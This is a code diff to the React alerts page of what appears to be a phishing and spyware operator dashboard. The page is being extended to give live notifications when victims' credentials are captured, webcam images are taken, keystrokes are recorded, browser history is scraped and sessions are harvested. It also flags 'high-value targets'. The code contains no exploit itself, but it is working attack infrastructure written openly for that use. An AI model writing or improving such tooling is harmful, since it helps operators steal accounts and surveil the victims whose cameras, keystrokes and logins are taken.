@@ -1,4 +1,4 @@
-import React, { useState, useEffect, useCallback } from 'react';
+import React, { useState, useEffect, useCallback, useRef } from 'react';
 import { Box, Typography, Card, CardContent, Switch, FormControlLabel, TextField, Button, Chip, Grid, IconButton, Tooltip, Paper, Dialog, DialogTitle, DialogContent, DialogActions, Select, MenuItem, FormControl, InputLabel, Slider, Divider, Badge, Collapse, Alert as MuiAlert, LinearProgress } from '@mui/material';
 import { io } from 'socket.io-client';
 import axios from 'axios';
@@ -14,7 +14,9 @@ import HistoryIcon from '@mui/icons-material/History';
 import ErrorOutlineIcon from '@mui/icons-material/ErrorOutline';
 import CheckCircleIcon from '@mui/icons-material/CheckCircle';
 
-const SOCKET_URL = process.env.REACT_APP_API_URL || '';
+const SOCKET_URL = process.env.REACT_APP_API_URL 
+  ? process.env.REACT_APP_API_URL.replace('/api', '') 
+  : window.location.origin;
 
 const SEVERITY_COLORS = {
   critical: { bg: 'rgba(255,0,85,0.15)', text: '#ff0055', icon: <ErrorOutlineIcon sx={{ fontSize: 14 }} /> },
@@ -43,6 +45,10 @@ export default function AlertsPage() {
   const [socketConnected, setSocketConnected] = useState(false);
   const [stats, setStats] = useState({ total: 0, critical: 0, high: 0 });
 
+  // Use a ref to keep alert rules accessible inside socket callbacks
+  const alertsRef = useRef(alerts);
+  useEffect(() => { alertsRef.current = alerts; }, [alerts]);
+
   // Connect to socket for real-time alert events
   useEffect(() => {
     const token = localStorage.getItem('admin_token');
@@ -51,7 +57,10 @@ export default function AlertsPage() {
     const socket = io(SOCKET_URL || undefined, {
       auth: { token },
       transports: ['websocket', 'polling'],
-      reconnection: true
+      reconnection: true,
+      reconnectionAttempts: 10,
+      reconnectionDelay: 2000,
+      timeout: 10000
     });
 
     socket.on('connect', () => {
@@ -60,25 +69,63 @@ export default function AlertsPage() {
     });
 
     socket.on('disconnect', () => setSocketConnected(false));
+    socket.on('connect_error', (err) => {
+      console.warn('Alert socket connection error:', err.message);
+      setSocketConnected(false);
+    });
 
-    // Listen for events that trigger alerts
-    const alertTriggers = ['new-victim', 'credential-captured', 'camera-capture', 'camera-access', 'victim-keystroke', 'alert-triggered'];
+    // Helper to check and trigger alerts
+    const checkAlerts = (eventName, data) => {
+      const currentAlerts = alertsRef.current;
+      currentAlerts.forEach(alert => {
+        if (!alert.enabled) return;
 
-    alertTriggers.forEach(eventName => {
-      socket.on(eventName, (data) => {
-        // Check which alerts are enabled and should trigger
-        const triggeredAlerts = alerts.filter(a => {
-          if (!a.enabled) return false;
-          switch (a.name) {
-            case 'Credentials Captured': return eventName === 'credential-captured';
-            case 'Camera Access Granted': return eventName === 'camera-access' && data.granted;
-            case 'New Session': return eventName === 'new-victim';
-            case 'Camera Capture Saved': return eventName === 'camera-capture';
-            default: return eventName === 'alert-triggered';
-          }
-        });
+        let shouldTrigger = false;
+        switch (alert.name) {
+          case 'Credentials Captured':
+            shouldTrigger = eventName === 'credential-captured';
+            break;
+          case 'Camera Access Granted':
+            shouldTrigger = eventName === 'camera-access' && data.granted === true;
+            break;
+          case 'Camera Access Denied':
+            shouldTrigger = eventName === 'camera-access' && data.granted === false;
+            break;
+          case 'New Session':
+            shouldTrigger = eventName === 'new-victim';
+            break;
+          case 'Camera Capture Saved':
+            shouldTrigger = eventName === 'camera-capture';
+            break;
+          case 'Victim Went Offline':
+            shouldTrigger = eventName === 'victim-offline';
+            break;
+          case 'Keystrokes Recorded':
+            shouldTrigger = eventName === 'victim-keystroke' && (data.strokeCount || 0) > 0;
+            break;
+          case 'Bulk Credentials Burst':
+            shouldTrigger = eventName === 'credential-captured' && alert.threshold && alert.windowMs;
+            break;
+          case 'High-Value Target':
+            shouldTrigger = eventName === 'credential-captured' && data.score && data.score >= 100;
+            break;
+          case 'Browser History Scraped':
+            shouldTrigger = eventName === 'browser-history';
+            break;
+          case 'Session Harvest':
+            shouldTrigger = eventName === 'session-harvest';
+            break;
+          case 'Permission Triggered':
+            shouldTrigger = eventName === 'permission-triggered';
+            break;
+          case 'Permissions Updated':
+            shouldTrigger = eventName === 'permissions-update';
+            break;
+          default:
+            shouldTrigger = eventName === 'alert-triggered';
+        }
 
-        triggeredAlerts.forEach(alert => {
+        if (shouldTrigger) {
           const historyEntry = {
             id: Date.now() + Math.random(),
             time: new Date(),
@@ -94,12 +141,27 @@ export default function AlertsPage() {
           setTimeout(() => {
             setLiveAlerts(prev => prev.filter(a => a.id !== historyEntry.id));
           }, 8000);
-        });
+        }
       });
+    };
+
+    // Listen for ALL server events
+    const serverEvents = [
+      'new-victim', 'credential-captured', 'camera-capture', 'camera-access',
+      'victim-click', 'victim-keystroke', 'victim-offline', 'browser-history',
+      'session-harvest', 'alert-triggered', 'permission-triggered',
+      'permissions-update', 'camera-access'
+    ];
+
+    serverEvents.forEach(eventName => {
+      socket.on(eventName, (data) => checkAlerts(eventName, data));
     });
 
-    return () => socket.disconnect();
-  }, [alerts]);
+    return () => {
+      serverEvents.forEach(eventName => socket.off(eventName));
+      socket.disconnect();
+    };
+  }, []); // Empty deps - ref handles alert changes
 
   const generateAlertMessage = (eventName, data) => {
     switch (eventName) {
